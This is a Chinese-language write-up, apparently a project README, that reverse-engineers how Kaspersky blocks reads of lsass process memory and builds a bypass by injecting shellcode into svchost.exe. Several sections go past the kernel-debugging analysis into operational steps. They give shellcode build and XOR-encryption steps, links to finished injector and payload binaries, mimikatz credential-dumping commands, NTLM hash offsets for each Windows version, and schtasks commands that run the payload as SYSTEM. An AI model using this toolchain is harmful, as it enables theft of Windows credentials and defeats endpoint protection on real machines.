# 关于八嘎司机对lsass进程内存防护的研究

读取进程内存的时候，最终会产生下面的系统调用

```
nt!NtReadVirtualMemory
```

那么我们就可以按照如下方式去下断点

 ```
 bp /p ffff838ff03e85c0 nt!NtReadVirtualMemory
```

其中`ffff838ff03e85c0`是读取lsass进程内存的用户进程的`EPROCESS`地址

我分别记录了在有卡巴保护和没有卡巴保护两种情况下的函数执行流程，发现两者的区别就是在调用函数`nt!ObpReferenceObjectByHandleWithTag`的返回值上

无保护情况下，返回值为0，说明读取正常，当有卡巴保护的时候，返回值就变成了`0xC0000022`

那么我么就先来研究一下这个函数

在单步调试函数`nt!NtReadVirtualMemory`的时候，看到了`nt!PsProcessType`，然后就google了一下这个东西，找到了xpn的这篇文章：

https://blog.xpnsec.com/anti-debug-openprocess/

简单来讲，`nt!PsProcessType`里面保存了一个`nt!_OBJECT_TYPE`的地址，如下:
```
1: kd> dt nt!_OBJECT_TYPE poi(nt!PsProcessType)
   +0x000 TypeList         : _LIST_ENTRY [ 0xffffbd8c`522d29f0 - 0xffffbd8c`522d29f0 ]
   +0x010 Name             : _UNICODE_STRING "Process"
   +0x020 DefaultObject    : (null) 
   +0x028 Index            : 0x7 ''
   +0x02c TotalNumberOfObjects : 0x8e
   +0x030 TotalNumberOfHandles : 0x43b
   +0x034 HighWaterNumberOfObjects : 0xbb
   +0x038 HighWaterNumberOfHandles : 0x49d
   +0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER
   +0x0b8 TypeLock         : _EX_PUSH_LOCK
   +0x0c0 Key              : 0x636f7250
   +0x0c8 CallbackList     : _LIST_ENTRY [ 0xffff9c89`ba443930 - 0xffff9c89`ba443930 ]
```

其中`0x0c8`偏移量是一个`LIST_ENTRY`，指向结构`CALLBACK_ENTRY_ITEM`，这个结构体的定义来自网上别人公开的，官方并没有关于该结构体的说明

```
typedef struct _CALLBACK_ENTRY_ITEM {
LIST_ENTRY EntryItemList;
OB_OPERATION Operations;
CALLBACK_ENTRY* CallbackEntry;
POBJECT_TYPE ObjectType;
POB_PRE_OPERATION_CALLBACK PreOperation;
POB_POST_OPERATION_CALLBACK PostOperation;
__int64 unk;
}CALLBACK_ENTRY_ITEM, *PCALLBACK_ENTRY_ITEM;
```

观察该结构体，我们队`PreOperation`和`PostOperation`比较感兴趣，因为从名字上大概也能看到，是进行了前置和后置操作，由于`LIST_ENTRY`占用0x10字节，因此`PreOperation`和`PostOperation`
字段的偏移量分别为`0x28`和`0x30`

```
1: kd> dq /c 1 0xffff9c89`ba443930
ffff9c89`ba443930  ffffbd8c`522d2ab8
ffff9c89`ba443938  ffffbd8c`522d2ab8
ffff9c89`ba443940  00000001`00000003
ffff9c89`ba443948  ffff9c89`ba443910
ffff9c89`ba443950  ffffbd8c`522d29f0
ffff9c89`ba443958  fffff808`1a6c4bd0
ffff9c89`ba443960  fffff808`1a6651a0

PreOperation:
 fffff808`1a6c4bd0
PostOperation:
 fffff808`1a6651a0

1: kd> u fffff808`1a6c4bd0
klif+0x64bd0:
fffff808`1a6c4bd0 48895c2408      mov     qword ptr [rsp+8],rbx
fffff808`1a6c4bd5 4889742418      mov     qword ptr [rsp+18h],rsi
fffff808`1a6c4bda 48897c2420      mov     qword ptr [rsp+20h],rdi
fffff808`1a6c4bdf 55              push    rbp
fffff808`1a6c4be0 4156            push    r14
fffff808`1a6c4be2 4157            push    r15
fffff808`1a6c4be4 488bec          mov     rbp,rsp
fffff808`1a6c4be7 4883ec40        sub     rsp,40h
1: kd> u fffff808`1a6651a0
klif+0x51a0:
fffff808`1a6651a0 c20000          ret     0
fffff808`1a6651a3 cc              int     3
fffff808`1a6651a4 cc              int     3
fffff808`1a6651a5 cc              int     3
fffff808`1a6651a6 cc              int     3
fffff808`1a6651a7 cc              int     3
fffff808`1a6651a8 cc              int     3
fffff808`1a6651a9 cc              int     3
```

可以看到`PostOperation`并没有什么好看的，我们重点看一下`PreOperation`，即`sub_140064BD0`

不过看样子他好像只是注册了OpenProcess函数的回调，没看到读取内存的回调


在阅读`nt!ObpReferenceObjectByHandleWithTag`函数的汇编代码期间，我学到了一些其他的知识，该函数的注释我放到了这里：




找到了关键代码

```asm
nt!ObpReferenceObjectByHandleWithTag+0x1cc:
fffff802`0cb3842c 8bc5            mov     eax,ebp
fffff802`0cb3842e f7d0            not     eax
; 2p DesiredAccess
; !0x1400 & 0x10 
; 所以有可能是卡巴更改了handle table entry里面的值 导致我们直接在这个地方跳走了
; 在把卡巴关闭之后，这个地方就变成了0x1410，取反之后就是 0xFFFFEBEF and 0x10 == 0
; 而开启卡巴的时候，是0x1400，取反之后是 0xFFFFEBFF and 0x10 != 0
; EBFF的二进制形式
; 1110101111111111
; 从windbg中来看，ExpLookupHandleTableEntry函数的返回值是一个nt!_andle_table_entry类型
; 而其偏移量为8的地方解释如下：
;    +0x008 GrantedAccessBits : Pos 0, 25 Bits
;    +0x008 NoRightsUpgrade  : Pos 25, 1 Bit
;    +0x008 Spare1           : Pos 26, 6 Bits
;    +0x00c Spare2           : Uint4B
; 前25个bit代表了允许的访问权限
; 那么0x1400就代表下面这两个权限
; PROCESS_QUERY_INFORMATION          (0x0400)  
; PROCESS_QUERY_LIMITED_INFORMATION  (0x1000) 
; 可以看到，卡巴的防护就是把0x10，也就是PROCESS_VM_READ访问权限给去掉了
fffff802`0cb38430 85842498000000  test    dword ptr [rsp+98h],eax
```

上面汇编代码中的`ebp`就是函数`ExpLookupHandleTableEntry`返回值（nt!_andle_table_entry）结构体的+0x8偏移量

那么肯定是我们在打开lsass进程的时候，卡巴做了PreOperation，对我们的handle进行了处理，抹掉了read权限



我们首先获取了lsass进程的句柄，获取句柄通过调用OpenProcess函数完成，而该函数对应的系统调用是`nt!NtOpenProcess`

而该系统调用其实是函数`nt!PsOpenProcess`的wrapper

该函数会调用`ObpCreateHandle`，该函数会通过dispatch_call来调用PreOperation

调用栈如下：
```
2: kd> k
 # Child-SP          RetAddr               Call Site
00 ffff8989`f0ce6e80 fffff802`809452fb     klif+0x64c4f
01 ffff8989`f0ce6ee0 fffff802`80936e65     nt!ObpCreateHandle+0xa5b
02 ffff8989`f0ce7140 fffff802`80932c34     nt!PsOpenProcess+0x535
03 ffff8989`f0ce7480 fffff802`80583c53     nt!NtOpenProcess+0x24
04 ffff8989`f0ce74c0 00007ffa`5dda0304     nt!KiSystemServiceCopyEnd+0x13
05 000000bb`ce53d508 00007ffa`5a9edbfd     ntdll!NtOpenProcess+0x14
06 000000bb`ce53d510 00007ff7`4f5024f5     KERNELBASE!OpenProcess+0x4d
07 (Inline Function) --------`--------     ConsoleApplication2!GrabLsassHandle+0x42 [C:\Users\LC\Downloads\ector\ConsoleApplication2\ConsoleApplication2.cpp @ 79] 
08 000000bb`ce53d580 00007ff7`4f508870     ConsoleApplication2!main+0x205 [C:\Users\LC\Downloads\ector\ConsoleApplication2\ConsoleApplication2.cpp @ 216] 
09 (Inline Function) --------`--------     ConsoleApplication2!invoke_main+0x22 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 78] 
0a 000000bb`ce53f960 00007ffa`5b311fe4     ConsoleApplication2!__scrt_common_main_seh+0x10c [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
0b 000000bb`ce53f9a0 00007ffa`5dd6ef91     KERNEL32!BaseThreadInitThunk+0x14
0c 000000bb`ce53f9d0 00000000`00000000     ntdll!RtlUserThreadStart+0x21
```


PreOperation函数的最终结果就是把rdx结构体中的AccessMask中的VM_READ权限给过滤掉了

初步的代码审计中发现了卡巴会检查尝试打开lsass.exe进程的进程是否是lsass.exe进程自己，然后又检查了打开lsass.exe进程的进程是否是lsass.exe进程的父进程

我在想能不能通过HOOK某个API函数，来让lsass进程执行我们的代码，lsass会在某个rpc的触发下去访问某个文件

我他妈真是个傻逼，HOOK api需要先注入到进程里面，现在连读进程内存的权限都没有，还想着注入，这不傻逼吗

# 更新

前面记录的preoperation的调用栈有错误，下面这个才是真正的调用栈

```
 # Child-SP          RetAddr               Call Site
00 ffffce86`87b5f170 fffff807`385e814a     nt!ObpCallPreOperationCallbacks+0x107
01 ffffce86`87b5f1f0 fffff807`38608223     nt!ObpPreInterceptHandleCreate+0xaa
02 ffffce86`87b5f260 fffff807`3861fca9     nt!ObpCreateHandle+0xce3
03 ffffce86`87b5f470 fffff807`385f0aef     nt!ObOpenObjectByPointer+0x1b9
04 ffffce86`87b5f6f0 fffff807`38654ad3     nt!PsOpenProcess+0x3af
05 ffffce86`87b5fa80 fffff807`384104f5     nt!NtOpenProcess+0x23
06 ffffce86`87b5fac0 00007ffb`48bcd4d4     nt!KiSystemServiceCopyEnd+0x25
07 0000005c`a88fd618 00007ffb`467e08ee     ntdll!NtOpenProcess+0x14
08 0000005c`a88fd620 000001d3`91316a50     0x00007ffb`467e08ee
09 0000005c`a88fd628 00000000`00000000     0x000001d3`91316a50
```


# 更新

关于函数
sub_18002B3E0
通过调用函数
sub_18002C074 
过滤链表节点的调用流程：

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/app2_%E5%9C%A8%E8%BF%87%E6%BB%A4%E8%8A%82%E7%82%B9%E6%97%B6%E7%9A%84%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B.asm

下断点的方式
```
ba  e1 /p ffffa9875bf3b080 klflt+2C074  "r rcx;.if(poi(rcx+2c) == 0000031000176105){.echo 1}.else{.echo 2;g}"
```


# 结论

注入svchost.exe即可获取到vm_read权限

# 检测规则

	第一次检测用的数组地址
	poi(poi(poi(ffffa98d58d5b450+c0)+58)+20)
	
	第二次检测用的数组地址
	? poi(poi(poi(poi(ffffa98d58d5b450+a8))+58)+20)

 ffffa98d58d5b450可以在18002B425 block中获得

 ![image](https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/assets/48377190/f57aa947-a18b-4d37-a2c0-b451d07f8eac)

+880即可获得链表地址

遍历链表

!list -x "dd /c 1 @$extret-78+2c L1" fffff800`2ee75e98

选择值为176105的那个节点，地址-2c，即可获得calculated_addr，将获取到的calculated_addr替换ffffa98d58d5b450即可


# 编写shellcode
为了节省栈空间，编写了如下代码生成脚本

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/%E5%9C%A8%E7%BC%96%E5%86%99shellcode%E7%9A%84%E6%97%B6%E5%80%99%E4%B8%BA%E4%BA%86%E8%8A%82%E7%9C%81%E6%A0%88%E7%A9%BA%E9%97%B4.html

用法如下：


```
char stack_string[50] = { 0 }; stack_string[0] = 'c'; stack_string[1] = 'a'; stack_string[2] = 'o'; stack_string[3] = 'n'; stack_string[4] = 'i'; stack_string[5] = 'n'; stack_string[6] = 'a'; stack_string[7] = 'i'; stack_string[8] = 'n'; stack_string[9] = 'a'; stack_string[10] = 'i';
	printf("%s\n", stack_string);
	SecureZeroMemory(stack_string, 50);

	stack_string[0] = 'c'; stack_string[1] = 'a'; stack_string[2] = 'o'; stack_string[3] = 'n'; stack_string[4] = 'i'; stack_string[5] = 'm'; stack_string[6] = 'a';
	printf("%s\n", stack_string);
```

shellcode代码写完之后，我们需要将其进行编译链接

参考：https://github.com/wqreytuk/ShellCodeAsmCleaner

然后我们需要使用pe-parser来提取text扇区


https://github.com/wqreytuk/pe_parser


## shellcode代码

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/shellcode.c


对生成的shellcode文件  data.bin进行异或加密的袁代码：

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/shellocde%E6%96%87%E4%BB%B6%E7%96%91%E6%83%91%E5%8A%A0%E5%AF%86.c

疑惑加密工具

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/ConsoleApplication1.7z

cd到shellcode  data.bin所在的目录执行该工具即可


## shellcode生成步骤

1.cpp就是我们的shellcode源代码

```
cd C:\Users\Public\shellcode
"C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\bin\amd64\vcvars64.bat"
 cl /c /FA /GS- 1.cpp
masm_shc.exe 1.asm asdasd
 ml64 /c asdasd
 link asdasd.obj /entry:main
```

上面的命令执行完成后，运行vs2010的pe-parser即可

masm_shc.exe在仓库  https://github.com/wqreytuk/ShellCodeAsmCleaner/blob/main/out/build/x64-Release/masm_shc/masm_shc.exe

上面的命令步骤是在远程服务器的windows7中进行的

## 主程序

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/%E4%B8%BB%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%A0%81.c


成品主程序文件

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/main.7z


## 解密脚本

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/1.py

改脚本的依赖只有一个
```
pycryptodome
```




将声称在C:\users\public下面的四个文件和解密脚本放在同一个目录下即可，解密结果在res.txt中
```
3iaad
aiaad
ili6ao
kiaad
```

上面这些文件中，`aiaad`是aes key，但是一般情况下不会用到，所以解密脚本中也没有实现aes解密，如果有需要再写

## 成品shellcode

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/data.7z

和main.exe放到一起即可

## lsasrv.dll版本适配

只需要修改main程序的_offset_table，往里面增加即可


## 关于获取windows各个大版本的credential偏移

可以使用我们的mimiaktz项目

修改文件`C:\Users\123\Downloads\mimikatz-main\mimikatz-master (1)\mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c`

在317行增加如下语句

```
helper = &lsassEnumHelpers[2];
```

根据要测试的版本修改lsassEnumHelpers数组的索引，主要看返回的版本中的数值对比，来确定索引

在350行增加如下语句
```
kprintf(L"\n\n helper->offsetToCredentials: %zd\n", helper->offsetToCredentials);
```

## windows7系列

后续的测试发现windows7系列的各种结构体的结构和win10并不一样，

## 项目更新

解密更改为了c代码

为了获取各种偏移量，使用下面这个mimikatz项目

```

privilege::debug
sekurlsa::logonpasswords
```

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/upload/main/mimikatz%E9%A1%B9%E7%9B%AE_%E7%94%A8%E4%BA%8E%E8%8E%B7%E5%8F%96%E5%90%84%E7%A7%8D%E5%81%8F%E7%A7%BB%E9%87%8F


要想获取ntlm hash在解密出来的明文中的偏移量，请使用

C:\Users\123\Downloads\mimikatz-main\mimikatz-master (1)\mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c

第1097行，不过首先需要首先修改

C:\Users\123\Downloads\mimikatz-main\mimikatz-master (1)\mimikatz\modules\sekurlsa\packages\kuhl_m_sekurlsa_msv1_0.c

第140行函数的返回值

下面是我从mimikatz源代码中获取的偏移量，

偏移量的计算方法为调试得到的值+8，因为还有个primary\0
```
版本号低于  10240 的偏移量为

32+8=====40

版本号  大于10240小于10586 的偏移量为
38+8=====46


版本号  大于10586小于14393 的偏移量为
40+8=====48

高于14393 的偏移量为
74+8=====82

```



解密程序源代码：


https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/decrypt.cccc.c


解密程序：

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/blob/main/ConsoleApplication3.7z






# win7系列的会话隔离问题

会导致我们无法注入svchost进程

通过创建计划任务来执行即可（使用psexec是不行的，即使你是system也不行）
```

 
  schtasks /create /tn MyApp /tr "C:\Users\Administrator\Desktop\mimikatz\main.exe" /sc once /sd 01/03/2003 /st 00:00 /ru system /f
  
  
  schtasks /run /tn MyApp
```

使用这种方式执行的时候注意要先把shellcode放到system32目录下

# 配套卡巴kes安装包

https://github.com/wqreytuk/Kaspersky_Lsass_Memory_Protection_study/tree/main/%E9%85%8D%E5%A5%97%E5%8D%A1%E5%B7%B4kes%E5%AE%89%E8%A3%85%E5%8C%85

只有这个版本的kes和ida文件中的偏移量是完全对应的
